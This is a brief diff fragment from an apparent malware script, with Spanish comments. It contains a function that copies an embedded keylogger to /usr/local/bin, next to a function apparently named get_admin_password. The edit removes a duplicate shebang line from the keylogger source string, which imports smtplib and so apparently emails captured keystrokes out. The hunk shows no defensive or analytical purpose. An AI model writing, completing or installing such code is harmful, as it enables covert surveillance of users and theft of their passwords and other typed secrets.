@@ -32,7 +32,6 @@ def get_admin_password():
 # Función para copiar el keylogger a /usr/local/bin
 def copy_keylogger():
     keylogger_code = '''#!/usr/bin/env python3
-#!/usr/bin/env python3
 import os
 import time
 import smtplib
